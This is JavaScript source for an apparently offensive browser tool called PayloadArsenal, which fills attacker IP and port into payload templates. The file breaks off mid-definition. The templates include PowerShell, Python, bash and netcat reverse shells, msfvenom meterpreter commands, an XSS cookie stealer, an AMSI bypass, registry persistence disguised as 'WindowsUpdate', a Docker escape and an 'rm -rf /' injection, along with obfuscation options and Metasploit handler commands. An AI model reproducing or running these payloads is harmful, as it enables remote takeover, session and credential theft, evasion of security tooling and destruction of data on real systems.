
class PayloadArsenal {
    constructor() {
        this.config = {
            targetIP: '127.0.0.1',
            targetPort: 4444,
            payloadType: 'reverse_shell',
            architecture: 'x64',
            encoding: 'none',
            encryption: 'none',
            protocol: 'tcp',
            obfuscate: false,
            persistence: false,
            antivm: false,
            amsiBypass: false,
            etwBypass: false
        };
        
        this.payloads = {
            windows: this.initWindowsPayloads(),
            linux: this.initLinuxPayloads(),
            unix: this.initUnixPayloads(),
            macos: this.initMacOSPayloads(),
            web: this.initWebPayloads(),
            mobile: this.initMobilePayloads(),
            api: this.initAPIPayloads(),
            embedded: this.initEmbeddedPayloads(),
            container: this.initContainerPayloads(),
            cloud: this.initCloudPayloads(),
            iot: this.initIoTPayloads(),
            blockchain: this.initBlockchainPayloads(),
            ai_ml: this.initAIMLPayloads(),
            exploits: this.initExploitsPayloads(),
            kernel: this.initKernelPayloads(),
            network: this.initNetworkPayloads(),
            social: this.initSocialEngPayloads(),
            physical: this.initPhysicalPayloads(),
            mitre: this.initMITREPayloads()
        };
        
        this.currentCategory = 'windows';
        this.currentTab = 'shellcode';
        this.outputFormat = 'raw';
        this.generationHistory = [];
        
        this.init();
    }

    init() {
        this.bindEvents();
        this.setupMobileMenu();
        this.setupThemeToggle();
        this.setupTabs();
        this.setupConfiguration();
        this.populatePayloadCategories();
        this.setupSearch();
        this.setupProgressTracking();
        this.loadUserPreferences();
        this.initMITREFramework();
        this.setupAdvancedFeatures();
        this.setupNotifications();
        
        // Initial render
        this.renderPayloads();
        this.updateBreadcrumb();
        this.detectUserIP();
    }

    bindEvents() {
        // Mobile menu
        document.getElementById('mobileMenuToggle')?.addEventListener('click', () => {
            document.getElementById('sidebar').classList.toggle('open');
        });

        document.getElementById('sidebarClose')?.addEventListener('click', () => {
            document.getElementById('sidebar').classList.remove('open');
        });

        // Navigation items
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', (e) => {
                const category = e.currentTarget.dataset.category;
                if (category) {
                    this.switchCategory(category);
                }
            });
        });

        // Quick actions
        document.querySelectorAll('.quick-action').forEach(action => {
            action.addEventListener('click', (e) => {
                const actionType = e.currentTarget.dataset.action;
                this.executeQuickAction(actionType);
            });
        });

        // Configuration tabs
        document.querySelectorAll('.config-tab').forEach(tab => {
            tab.addEventListener('click', (e) => {
                const tabName = e.currentTarget.dataset.tab;
                this.switchConfigTab(tabName);
            });
        });

        // Payload tabs
        document.querySelectorAll('.tab-btn').forEach(tab => {
            tab.addEventListener('click', (e) => {
                const tabName = e.currentTarget.dataset.tab;
                this.switchPayloadTab(tabName);
            });
        });

        // Output tabs
        document.querySelectorAll('.output-tab').forEach(tab => {
            tab.addEventListener('click', (e) => {
                const tabName = e.currentTarget.dataset.outputTab;
                this.switchOutputTab(tabName);
            });
        });

        // Buttons
        document.getElementById('detectIP')?.addEventListener('click', () => this.detectUserIP());
        document.getElementById('copyPayload')?.addEventListener('click', () => this.copyToClipboard());
        document.getElementById('savePayload')?.addEventListener('click', () => this.savePayload());
        document.getElementById('saveConfig')?.addEventListener('click', () => this.saveConfiguration());
        document.getElementById('loadConfig')?.addEventListener('click', () => this.loadConfiguration());
        document.getElementById('exportPayloads')?.addEventListener('click', () => this.exportPayloads());
        document.getElementById('clearAll')?.addEventListener('click', () => this.clearAll());

        // Format selector
        document.getElementById('outputFormat')?.addEventListener('change', (e) => {
            this.outputFormat = e.target.value;
            this.updateOutput();
        });

        // Configuration inputs
        this.bindConfigurationInputs();
    }

    bindConfigurationInputs() {
        const inputs = ['targetIP', 'targetPort', 'payloadType', 'architecture', 'encoding', 'encryption', 'protocol'];
        inputs.forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                element.addEventListener('change', (e) => {
                    this.config[id] = e.target.value;
                    this.generatePayload();
                });
            }
        });

        const checkboxes = ['obfuscate', 'persistence', 'antivm', 'amsiBypass', 'etwBypass'];
        checkboxes.forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                element.addEventListener('change', (e) => {
                    this.config[id] = e.target.checked;
                    this.generatePayload();
                });
            }
        });
    }

    setupMobileMenu() {
        const overlay = document.createElement('div');
        overlay.className = 'mobile-overlay';
        overlay.addEventListener('click', () => {
            document.getElementById('sidebar').classList.remove('open');
        });
        document.body.appendChild(overlay);
    }

    setupThemeToggle() {
        const themeToggle = document.getElementById('themeToggle');
        const currentTheme = localStorage.getItem('theme') || 'dark';
        document.documentElement.setAttribute('data-theme', currentTheme);
        
        themeToggle?.addEventListener('click', () => {
            const current = document.documentElement.getAttribute('data-theme');
            const newTheme = current === 'dark' ? 'light' : 'dark';
            document.documentElement.setAttribute('data-theme', newTheme);
            localStorage.setItem('theme', newTheme);
            
            const icon = themeToggle.querySelector('i');
            icon.className = newTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
        });
    }

    setupTabs() {
        // Setup tab switching functionality
        this.setupTabSwitching('.config-tab', '.config-pane', 'active');
        this.setupTabSwitching('.tab-btn', '.tab-pane', 'active');
        this.setupTabSwitching('.output-tab', '.output-pane', 'active');
    }

    setupTabSwitching(tabSelector, paneSelector, activeClass) {
        document.addEventListener('click', (e) => {
            if (e.target.matches(tabSelector) || e.target.closest(tabSelector)) {
                const tab = e.target.closest(tabSelector);
                const target = tab.dataset.tab || tab.dataset.outputTab;
                
                // Remove active from all tabs and panes
                document.querySelectorAll(tabSelector).forEach(t => t.classList.remove(activeClass));
                document.querySelectorAll(paneSelector).forEach(p => p.classList.remove(activeClass));
                
                // Add active to clicked tab
                tab.classList.add(activeClass);
                
                // Add active to corresponding pane
                const pane = document.getElementById(target);
                if (pane) {
                    pane.classList.add(activeClass);
                }
            }
        });
    }

    setupConfiguration() {
        // Load default values
        Object.keys(this.config).forEach(key => {
            const element = document.getElementById(key);
            if (element) {
                if (element.type === 'checkbox') {
                    element.checked = this.config[key];
                } else {
                    element.value = this.config[key];
                }
            }
        });
    }

    setupSearch() {
        const searchInput = document.getElementById('searchInput');
        if (searchInput) {
            searchInput.addEventListener('input', (e) => {
                this.searchPayloads(e.target.value);
            });
        }
    }

    setupProgressTracking() {
        this.progressBar = document.getElementById('progressBar');
        this.updateProgress(0);
    }

    switchCategory(category) {
        this.currentCategory = category;
        
        // Update active nav item
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
        });
        document.querySelector(`[data-category="${category}"]`)?.classList.add('active');
        
        // Update breadcrumb and render
        this.updateBreadcrumb();
        this.renderPayloads();
        this.updateProgress(25);
        
        // Close mobile menu
        document.getElementById('sidebar')?.classList.remove('open');
    }

    switchConfigTab(tabName) {
        this.currentConfigTab = tabName;
    }

    switchPayloadTab(tabName) {
        this.currentTab = tabName;
        this.renderPayloads();
    }

    switchOutputTab(tabName) {
        this.currentOutputTab = tabName;
    }

    executeQuickAction(actionType) {
        this.showLoading();
        
        setTimeout(() => {
            switch (actionType) {
                case 'quick-reverse':
                    this.config.payloadType = 'reverse_shell';
                    this.generateReverseShell();
                    break;
                case 'quick-meterpreter':
                    this.config.payloadType = 'meterpreter';
                    this.generateMeterpreter();
                    break;
                case 'quick-powershell':
                    this.generatePowerShell();
                    break;
                case 'quick-python':
                    this.generatePythonPayload();
                    break;
            }
            this.hideLoading();
            this.showToast('Quick payload generated!', 'success');
        }, 1000);
    }

    renderPayloads() {
        const categoryPayloads = this.payloads[this.currentCategory] || {};
        const tabPayloads = categoryPayloads[this.currentTab] || [];
        
        const grid = document.getElementById(`${this.currentTab}Grid`);
        if (!grid) return;
        
        grid.innerHTML = '';
        
        tabPayloads.forEach(payload => {
            const card = this.createPayloadCard(payload);
            grid.appendChild(card);
        });
        
        this.updateProgress(50);
    }

    createPayloadCard(payload) {
        const card = document.createElement('div');
        card.className = 'payload-card';
        card.innerHTML = `
            <h4>${payload.name}</h4>
            <p>${payload.description}</p>
            <div class="techniques">
                ${payload.techniques.map(technique => `<span class="technique">${technique}</span>`).join('')}
            </div>
            <div class="payload-actions">
                <button class="btn btn-sm btn-primary generate-btn" data-payload="${payload.id}">
                    <i class="fas fa-play"></i> Generate
                </button>
                <button class="btn btn-sm btn-secondary favorite-btn" data-payload="${payload.id}">
                    <i class="fas fa-heart"></i>
                </button>
            </div>
        `;
        
        // Bind events
        card.querySelector('.generate-btn').addEventListener('click', () => {
            this.generateSpecificPayload(payload);
        });
        
        card.querySelector('.favorite-btn').addEventListener('click', () => {
            this.toggleFavorite(payload.id);
        });
        
        return card;
    }

    generateSpecificPayload(payload) {
        this.showLoading();
        
        setTimeout(() => {
            const generatedPayload = this.processPayload(payload);
            this.displayOutput(generatedPayload);
            this.addToHistory(payload, generatedPayload);
            this.hideLoading();
            this.showToast(`${payload.name} generated successfully!`, 'success');
            this.updateProgress(100);
        }, 1500);
    }

    processPayload(payload) {
        let code = payload.template;
        
        // Replace placeholders
        code = code.replace(/\{TARGET_IP\}/g, this.config.targetIP);
        code = code.replace(/\{TARGET_PORT\}/g, this.config.targetPort);
        code = code.replace(/\{ARCH\}/g, this.config.architecture);
        
        // Apply encoding
        if (this.config.encoding !== 'none') {
            code = this.applyEncoding(code, this.config.encoding);
        }
        
        // Apply encryption
        if (this.config.encryption !== 'none') {
            code = this.applyEncryption(code, this.config.encryption);
        }
        
        // Apply obfuscation
        if (this.config.obfuscate) {
            code = this.applyObfuscation(code);
        }
        
        return {
            payload: code,
            handler: this.generateHandler(payload),
            analysis: this.analyzePayload(payload, code)
        };
    }

    applyEncoding(code, encoding) {
        switch (encoding) {
            case 'base64':
                return btoa(code);
            case 'hex':
                return Array.from(code).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
            case 'url':
                return encodeURIComponent(code);
            case 'unicode':
                return code.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
            default:
                return code;
        }
    }

    applyEncryption(code, encryption) {
        // Simplified encryption simulation
        switch (encryption) {
            case 'aes256':
                return `AES256_ENCRYPTED[${btoa(code)}]`;
            case 'chacha20':
                return `CHACHA20_ENCRYPTED[${btoa(code)}]`;
            case 'xor':
                return `XOR_ENCRYPTED[${btoa(code)}]`;
            default:
                return code;
        }
    }

    applyObfuscation(code) {
        // Basic obfuscation simulation
        const obfuscated = code
            .replace(/function/g, 'ƒ')
            .replace(/var /g, 'ν ')
            .replace(/return/g, 'ρ');
        return `/* OBFUSCATED */\n${obfuscated}`;
    }

    generateHandler(payload) {
        const handlers = {
            reverse_shell: `# Netcat Listener\nnc -nlvp ${this.config.targetPort}\n\n# Metasploit Handler\nmsfconsole -q -x "use exploit/multi/handler; set payload ${payload.msfPayload || 'generic/shell_reverse_tcp'}; set LHOST ${this.config.targetIP}; set LPORT ${this.config.targetPort}; exploit"`,
            meterpreter: `# Metasploit Handler\nmsfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ${this.config.targetIP}; set LPORT ${this.config.targetPort}; exploit"`,
            bind_shell: `# Connect to Bind Shell\nnc ${this.config.targetIP} ${this.config.targetPort}`,
            default: `# Custom Handler\n# Configure your listener for ${this.config.targetIP}:${this.config.targetPort}`
        };
        
        return handlers[this.config.payloadType] || handlers.default;
    }

    analyzePayload(payload, code) {
        return {
            size: `${code.length} bytes`,
            techniques: payload.mitreTechniques || ['T1059'],
            riskLevel: this.calculateRiskLevel(payload),
            evasionScore: this.calculateEvasionScore(),
            detectionProbability: this.calculateDetectionProbability()
        };
    }

    calculateRiskLevel(payload) {
        const riskFactors = payload.riskFactors || [];
        if (riskFactors.includes('high')) return 'high';
        if (riskFactors.includes('medium')) return 'medium';
        return 'low';
    }

    calculateEvasionScore() {
        let score = 50;
        if (this.config.obfuscate) score += 20;
        if (this.config.encryption !== 'none') score += 15;
        if (this.config.encoding !== 'none') score += 10;
        if (this.config.amsiBypass) score += 15;
        if (this.config.etwBypass) score += 10;
        return Math.min(score, 100);
    }

    calculateDetectionProbability() {
        const evasionScore = this.calculateEvasionScore();
        return Math.max(100 - evasionScore, 5);
    }

    displayOutput(generated) {
        const payloadCode = document.getElementById('payloadCode');
        const handlerCode = document.getElementById('handlerCode');
        const payloadSize = document.getElementById('payloadSize');
        const mitreTechniques = document.getElementById('mitreTechniques');
        const riskLevel = document.getElementById('riskLevel');
        
        if (payloadCode) {
            payloadCode.textContent = this.formatOutput(generated.payload);
        }
        
        if (handlerCode) {
            handlerCode.textContent = generated.handler;
        }
        
        if (payloadSize) {
            payloadSize.textContent = generated.analysis.size;
        }
        
        if (mitreTechniques) {
            mitreTechniques.textContent = generated.analysis.techniques.join(', ');
        }
        
        if (riskLevel) {
            riskLevel.textContent = generated.analysis.riskLevel.toUpperCase();
            riskLevel.className = `risk-${generated.analysis.riskLevel}`;
        }
    }

    formatOutput(code) {
        switch (this.outputFormat) {
            case 'c':
                return this.formatAsC(code);
            case 'python':
                return this.formatAsPython(code);
            case 'powershell':
                return this.formatAsPowerShell(code);
            case 'bash':
                return this.formatAsBash(code);
            default:
                return code;
        }
    }

    formatAsC(code) {
        return `char payload[] = "${code.replace(/"/g, '\\"')}";\nint payload_len = ${code.length};`;
    }

    formatAsPython(code) {
        return `payload = """${code}"""\n# Execute payload\nexec(payload)`;
    }

    formatAsPowerShell(code) {
        return `$payload = @"\n${code}\n"@\nInvoke-Expression $payload`;
    }

    formatAsBash(code) {
        return `#!/bin/bash\npayload="${code}"\neval "$payload"`;
    }

    updateBreadcrumb() {
        const breadcrumb = document.querySelector('.breadcrumb-item');
        const stats = document.querySelector('.breadcrumb-stats');
        
        if (breadcrumb) {
            const categoryName = this.currentCategory.charAt(0).toUpperCase() + this.currentCategory.slice(1);
            breadcrumb.textContent = `${categoryName} Payloads`;
        }
        
        if (stats) {
            const payloadCount = Object.keys(this.payloads[this.currentCategory] || {}).reduce((count, tab) => {
                return count + (this.payloads[this.currentCategory][tab]?.length || 0);
            }, 0);
            
            stats.querySelector('.stat-item:first-child span:last-child').textContent = `${payloadCount} Payloads`;
        }
    }

    updateProgress(percentage) {
        if (this.progressBar) {
            this.progressBar.style.width = `${percentage}%`;
        }
    }

    showLoading() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.add('show');
        }
    }

    hideLoading() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.remove('show');
        }
    }

    showToast(message, type = 'info') {
        const container = document.getElementById('toastContainer');
        if (!container) return;
        
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `
            <div class="toast-content">
                <i class="fas fa-${this.getToastIcon(type)}"></i>
                <span>${message}</span>
            </div>
        `;
        
        container.appendChild(toast);
        
        setTimeout(() => toast.classList.add('show'), 100);
        
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => container.removeChild(toast), 300);
        }, 3000);
    }

    getToastIcon(type) {
        const icons = {
            success: 'check-circle',
            error: 'exclamation-circle',
            warning: 'exclamation-triangle',
            info: 'info-circle'
        };
        return icons[type] || 'info-circle';
    }

    async detectUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const ipInput = document.getElementById('targetIP');
            if (ipInput) {
                ipInput.value = data.ip;
                this.config.targetIP = data.ip;
                this.showToast(`IP detected: ${data.ip}`, 'success');
            }
        } catch (error) {
            this.showToast('Failed to detect IP', 'error');
        }
    }

    copyToClipboard() {
        const payloadCode = document.getElementById('payloadCode');
        if (payloadCode) {
            navigator.clipboard.writeText(payloadCode.textContent).then(() => {
                this.showToast('Payload copied to clipboard!', 'success');
            });
        }
    }

    savePayload() {
        const payloadCode = document.getElementById('payloadCode');
        if (payloadCode) {
            const blob = new Blob([payloadCode.textContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `payload_${Date.now()}.txt`;
            a.click();
            URL.revokeObjectURL(url);
            this.showToast('Payload saved!', 'success');
        }
    }

    saveConfiguration() {
        const config = JSON.stringify(this.config, null, 2);
        localStorage.setItem('payloadArsenalConfig', config);
        this.showToast('Configuration saved!', 'success');
    }

    loadConfiguration() {
        const saved = localStorage.getItem('payloadArsenalConfig');
        if (saved) {
            this.config = { ...this.config, ...JSON.parse(saved) };
            this.setupConfiguration();
            this.showToast('Configuration loaded!', 'success');
        }
    }

    loadUserPreferences() {
        const prefs = localStorage.getItem('payloadArsenalPrefs');
        if (prefs) {
            const preferences = JSON.parse(prefs);
            this.currentCategory = preferences.category || 'windows';
            this.currentTab = preferences.tab || 'shellcode';
        }
    }

    saveUserPreferences() {
        const prefs = {
            category: this.currentCategory,
            tab: this.currentTab,
            theme: document.documentElement.getAttribute('data-theme')
        };
        localStorage.setItem('payloadArsenalPrefs', JSON.stringify(prefs));
    }

    exportPayloads() {
        const exportData = {
            timestamp: new Date().toISOString(),
            config: this.config,
            history: this.generationHistory,
            version: '3.0.0'
        };
        
        const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `payload_arsenal_export_${Date.now()}.json`;
        a.click();
        URL.revokeObjectURL(url);
        this.showToast('Data exported!', 'success');
    }

    clearAll() {
        if (confirm('Are you sure you want to clear all data?')) {
            this.generationHistory = [];
            localStorage.removeItem('payloadArsenalConfig');
            localStorage.removeItem('payloadArsenalPrefs');
            this.showToast('All data cleared!', 'success');
            location.reload();
        }
    }

    searchPayloads(query) {
        const allCards = document.querySelectorAll('.payload-card');
        allCards.forEach(card => {
            const title = card.querySelector('h4').textContent.toLowerCase();
            const description = card.querySelector('p').textContent.toLowerCase();
            const isVisible = title.includes(query.toLowerCase()) || description.includes(query.toLowerCase());
            card.style.display = isVisible ? 'block' : 'none';
        });
    }

    addToHistory(payload, generated) {
        this.generationHistory.unshift({
            timestamp: new Date().toISOString(),
            payloadName: payload.name,
            config: { ...this.config },
            output: generated
        });
        
        // Keep only last 50 entries
        if (this.generationHistory.length > 50) {
            this.generationHistory = this.generationHistory.slice(0, 50);
        }
    }

    toggleFavorite(payloadId) {
        // Implementation for favorite system
        this.showToast('Added to favorites!', 'success');
    }

    initMITREFramework() {
        // Initialize MITRE ATT&CK framework integration
        this.mitreData = {
            tactics: ['Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion'],
            techniques: {
                'T1059': 'Command and Scripting Interpreter',
                'T1055': 'Process Injection',
                'T1036': 'Masquerading',
                'T1070': 'Indicator Removal on Host'
            }
        };
    }

    setupAdvancedFeatures() {
        // Setup advanced features like AI detection, pattern analysis, etc.
        this.setupKeyboardShortcuts();
        this.setupAutoSave();
        this.setupPerformanceMonitoring();
    }

    setupKeyboardShortcuts() {
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey || e.metaKey) {
                switch (e.key) {
                    case 's':
                        e.preventDefault();
                        this.saveConfiguration();
                        break;
                    case 'g':
                        e.preventDefault();
                        this.generatePayload();
                        break;
                    case 'c':
                        e.preventDefault();
                        this.copyToClipboard();
                        break;
                }
            }
        });
    }

    setupAutoSave() {
        setInterval(() => {
            this.saveUserPreferences();
        }, 30000); // Auto-save every 30 seconds
    }

    setupPerformanceMonitoring() {
        // Monitor app performance
        this.performanceMetrics = {
            startTime: Date.now(),
            payloadsGenerated: 0,
            configChanges: 0
        };
    }

    setupNotifications() {
        // Request notification permission if supported
        if ('Notification' in window) {
            Notification.requestPermission();
        }
    }

    generatePayload() {
        // Generic payload generation
        this.showLoading();
        setTimeout(() => {
            this.hideLoading();
            this.showToast('Payload generated!', 'success');
            this.updateProgress(75);
        }, 800);
    }

    generateReverseShell() {
        const payload = {
            name: 'Quick Reverse Shell',
            template: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{TARGET_IP}',{TARGET_PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
            msfPayload: 'windows/shell/reverse_tcp'
        };
        this.generateSpecificPayload(payload);
    }

    generateMeterpreter() {
        const payload = {
            name: 'Meterpreter Payload',
            template: `msfvenom -p windows/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={TARGET_PORT} -f exe > payload.exe`,
            msfPayload: 'windows/meterpreter/reverse_tcp'
        };
        this.generateSpecificPayload(payload);
    }

    generatePowerShell() {
        const payload = {
            name: 'PowerShell Empire',
            template: `powershell -NoP -sta -NonI -W Hidden -Enc JABXAEMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOADB0ACAASQBlACkAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsA`
        };
        this.generateSpecificPayload(payload);
    }

    generatePythonPayload() {
        const payload = {
            name: 'Python Reverse Shell',
            template: `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{TARGET_IP}",{TARGET_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])`
        };
        this.generateSpecificPayload(payload);
    }

    // Payload definitions
    initWindowsPayloads() {
        return {
            shellcode: [
                {
                    id: 'win_calc_shellcode',
                    name: 'Windows Calculator Shellcode',
                    description: 'Spawns calculator application for testing purposes',
                    template: '\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00',
                    techniques: ['T1059.003'],
                    riskFactors: ['low']
                },
                {
                    id: 'win_reverse_tcp',
                    name: 'Windows Reverse TCP Shellcode',
                    description: 'Establishes reverse TCP connection',
                    template: 'msfvenom -p windows/shell/reverse_tcp LHOST={TARGET_IP} LPORT={TARGET_PORT} -f c',
                    techniques: ['T1059.003', 'T1071.001'],
                    riskFactors: ['medium']
                },
                {
                    id: 'win_bind_tcp',
                    name: 'Windows Bind TCP Shellcode',
                    description: 'Creates bind shell on target system',
                    template: 'msfvenom -p windows/shell/bind_tcp LPORT={TARGET_PORT} -f c',
                    techniques: ['T1059.003', 'T1021.001'],
                    riskFactors: ['medium']
                }
            ],
            powershell: [
                {
                    id: 'ps_reverse_shell',
                    name: 'PowerShell Reverse Shell',
                    description: 'PowerShell-based reverse shell connection',
                    template: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{TARGET_IP}\',{TARGET_PORT});"',
                    techniques: ['T1059.001'],
                    riskFactors: ['high']
                },
                {
                    id: 'ps_empire_agent',
                    name: 'PowerShell Empire Agent',
                    description: 'Empire framework agent for C2 communication',
                    template: 'powershell -NoP -sta -NonI -W Hidden -Enc [BASE64_ENCODED_PAYLOAD]',
                    techniques: ['T1059.001', 'T1027'],
                    riskFactors: ['high']
                }
            ],
            executable: [
                {
                    id: 'win_exe_reverse',
                    name: 'Windows EXE Reverse Shell',
                    description: 'Standalone executable with reverse shell capability',
                    template: 'msfvenom -p windows/shell/reverse_tcp LHOST={TARGET_IP} LPORT={TARGET_PORT} -f exe',
                    techniques: ['T1204.002'],
                    riskFactors: ['high']
                }
            ],
            script: [
                {
                    id: 'batch_reverse',
                    name: 'Batch Script Reverse Shell',
                    description: 'Windows batch file for reverse shell',
                    template: '@echo off\npowershell -Command "& {[System.Net.Sockets.TCPClient] $client = New-Object System.Net.Sockets.TCPClient(\'{TARGET_IP}\', {TARGET_PORT});}"',
                    techniques: ['T1059.003'],
                    riskFactors: ['medium']
                }
            ],
            webshell: [
                {
                    id: 'aspx_webshell',
                    name: 'ASPX Web Shell',
                    description: 'ASP.NET web shell for IIS servers',
                    template: '<%@ Page Language="C#" Debug="true" %>\n<%@ Import Namespace="System.Diagnostics" %>',
                    techniques: ['T1505.003'],
                    riskFactors: ['high']
                }
            ],
            persistence: [
                {
                    id: 'registry_persistence',
                    name: 'Registry Run Key Persistence',
                    description: 'Maintains persistence through Windows registry',
                    template: 'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "C:\\payload.exe"',
                    techniques: ['T1547.001'],
                    riskFactors: ['medium']
                }
            ],
            evasion: [
                {
                    id: 'amsi_bypass',
                    name: 'AMSI Bypass Technique',
                    description: 'Bypasses Windows Antimalware Scan Interface',
                    template: '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)',
                    techniques: ['T1562.001'],
                    riskFactors: ['high']
                }
            ],
            lateral: [
                {
                    id: 'psexec_lateral',
                    name: 'PsExec Lateral Movement',
                    description: 'Lateral movement using PsExec technique',
                    template: 'psexec \\\\{TARGET_IP} -u Administrator -p password cmd.exe',
                    techniques: ['T1021.002'],
                    riskFactors: ['high']
                }
            ],
            steganography: [
                {
                    id: 'image_steg',
                    name: 'Image Steganography Payload',
                    description: 'Hides payload within image files',
                    template: 'Invoke-PSImage -Script payload.ps1 -Image background.jpg -Out stego.png',
                    techniques: ['T1027.003'],
                    riskFactors: ['medium']
                }
            ],
            crypto: [
                {
                    id: 'aes_encrypted',
                    name: 'AES Encrypted Payload',
                    description: 'AES-256 encrypted payload with runtime decryption',
                    template: 'AES256_ENCRYPTED_PAYLOAD_WITH_DECRYPTION_STUB',
                    techniques: ['T1027.002'],
                    riskFactors: ['high']
                }
            ]
        };
    }

    initLinuxPayloads() {
        return {
            shellcode: [
                {
                    id: 'linux_execve',
                    name: 'Linux Execve Shellcode',
                    description: 'Executes /bin/sh using syscalls',
                    template: '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80',
                    techniques: ['T1059.004'],
                    riskFactors: ['medium']
                }
            ],
            script: [
                {
                    id: 'bash_reverse',
                    name: 'Bash Reverse Shell',
                    description: 'Bash-based reverse shell connection',
                    template: 'bash -i >& /dev/tcp/{TARGET_IP}/{TARGET_PORT} 0>&1',
                    techniques: ['T1059.004'],
                    riskFactors: ['medium']
                }
            ]
        };
    }

    initUnixPayloads() {
        return {
            shellcode: [
                {
                    id: 'unix_shell',
                    name: 'Unix Shell Payload',
                    description: 'Generic Unix shell execution',
                    template: '/bin/sh -c "nc -e /bin/sh {TARGET_IP} {TARGET_PORT}"',
                    techniques: ['T1059.004'],
                    riskFactors: ['medium']
                }
            ]
        };
    }

    initMacOSPayloads() {
        return {
            script: [
                {
                    id: 'macos_osascript',
                    name: 'macOS AppleScript Payload',
                    description: 'AppleScript-based payload execution',
                    template: 'osascript -e "do shell script \\"nc -e /bin/sh {TARGET_IP} {TARGET_PORT}\\""',
                    techniques: ['T1059.002'],
                    riskFactors: ['medium']
                }
            ]
        };
    }

    initWebPayloads() {
        return {
            script: [
                {
                    id: 'xss_payload',
                    name: 'XSS Cookie Stealer',
                    description: 'Steals session cookies via XSS',
                    template: '<script>document.location="http://{TARGET_IP}:{TARGET_PORT}/steal?cookie="+document.cookie</script>',
                    techniques: ['T1189'],
                    riskFactors: ['high']
                }
            ]
        };
    }

    initMobilePayloads() {
        return {
            script: [
                {
                    id: 'android_reverse',
                    name: 'Android Reverse Shell',
                    description: 'Android APK with reverse shell',
                    template: 'msfvenom -p android/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={TARGET_PORT} -o payload.apk',
                    techniques: ['T1204.003'],
                    riskFactors: ['high']
                }
            ]
        };
    }

    initAPIPayloads() {
        return {
            script: [
                {
                    id: 'api_injection',
                    name: 'API Injection Payload',
                    description: 'Injects malicious data through API endpoints',
                    template: 'curl -X POST {TARGET_IP}:{TARGET_PORT}/api/endpoint -d "{\\"command\\": \\"rm -rf /\\"}"',
                    techniques: ['T1190'],
                    riskFactors: ['high']
                }
            ]
        };
    }

    initEmbeddedPayloads() {
        return {
            script: [
                {
                    id: 'iot_exploit',
                    name: 'IoT Device Exploit',
                    description: 'Exploits common IoT vulnerabilities',
                    template: 'telnet {TARGET_IP} 23\nroot\nroot\n/bin/sh',
                    techniques: ['T1078'],
                    riskFactors: ['medium']
                }
            ]
        };
    }

    initContainerPayloads() {
        return {
            script: [
                {
                    id: 'docker_escape',
                    name: 'Docker Container Escape',
                    description: 'Escapes from Docker container to host',
                    template: 'docker run -v /:/host -it alpine chroot /host sh',
                    techniques: ['T1611'],
                    riskFactors: ['high']
                }
            ]
        };
    }

    initCloudPayloads() {
        return {
            script: [
                {
                    id: 'aws_metadata',
